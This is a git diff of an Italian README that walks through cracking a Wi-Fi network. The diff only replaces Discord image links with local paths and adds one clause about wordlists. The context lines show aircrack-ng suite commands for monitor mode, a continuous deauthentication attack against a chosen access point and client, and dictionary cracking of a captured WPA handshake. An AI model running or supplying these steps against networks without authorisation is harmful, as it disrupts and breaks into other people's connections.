@@ -11,7 +11,7 @@ Iniziamo aprendo un terminale e seguendo i seguenti comandi: <br>
 ┕$ iwconfig
 ```
 <p align="center">
-  <img src="https://media.discordapp.net/attachments/894962833773711380/1205236414799806484/1.png?ex=662a08a1&is=6628b721&hm=e96abaa749a864390b4ee13873ab9c7a1281f3e3bb0677c5987b5c31a8c553a6&=&format=webp&quality=lossless">
+  <img src="img/1.png">
 </p>
 Una volta eseguito il comando ci usciranno tutte le schede internet che possediamo sulla macchina. Per iniziare creiamo una scheda parallela virtuale per iniziare il listening delle reti: <br>
 
@@ -21,7 +21,7 @@ Una volta eseguito il comando ci usciranno tutte le schede internet che possedia
 ┕$ sudo airomon-ng start wlan
 ```
 <p align="center">
-  <img src="https://media.discordapp.net/attachments/894962833773711380/1205236418083815434/2.png?ex=662a08a2&is=6628b722&hm=3f5ff56ee293186eecdd33b3b169f04975034e815ed621b121c20dd920456cfe&=&format=webp&quality=lossless">
+  <img src="img/2.png">
 </p>
 Successivamente per visualizzare tutte le reti disponibili: <br>
 
@@ -32,7 +32,7 @@ Successivamente per visualizzare tutte le reti disponibili: <br>
 ```
 <br>
 <p align="center">
-  <img src="https://media.discordapp.net/attachments/894962833773711380/1205236418327089172/4.png?ex=662a08a2&is=6628b722&hm=ac028cd41dede47486ad5a29ee4992038cc01512a386566eb3c6411157ca3487&=&format=webp&quality=lossless">
+  <img src="img/4.png">
 </p>
 Tra i risultati dobbiamo copiare il BSSID della rete in questione ed eseguire il comando:
 
@@ -56,7 +56,7 @@ Attacco deauth integrato <br>
 ┕$ sudo aireplay-ng --deauth 0 -a BSSID -c STATION wlan0mon
 ```
 <p align="center">
-  <img src="https://media.discordapp.net/attachments/894962833773711380/1205236418616627231/5.png?ex=662a08a2&is=6628b722&hm=575b361e7a8201ce8926fdf9980cba8740ce7ac23aed1229b91d28e39ece0a48&=&format=webp&quality=lossless&width=1193&height=671">
+  <img src="img/5.png">
 </p>
 
 ## $${\color{white}WPA \space \color{green}handshake \space \color{red}decrypt}$$
@@ -69,9 +69,9 @@ Una volta effettuato l'attacco sul terminale linux dovremo trovare un WPA handsh
 ┕$ sudo aircrack-ng NomeFile-01.cap -w Password.txt 
 ```
 <p align="center">
-  <img src="https://media.discordapp.net/attachments/894962833773711380/1205236418977472573/6.png?ex=662a08a2&is=6628b722&hm=63eb531c000c29d0ac4f6842fd0a8790eb41bbc3b5bbc75b7cf561ea03a890ce&=&format=webp&quality=lossless">
+  <img src="img/6.png">
 </p>
-Il tempo di decriptazione può variare in base alla difficoltà della password.
+Il tempo di decriptazione può variare in base alla difficoltà della password e dalla lista che viene usata.
 
 ## $${\color{orange}Tools}$$
 [Flipper Zero](https://flipperzero.one/) accoppiato con [ESP32](https://en.wikipedia.org/wiki/ESP32). <br>
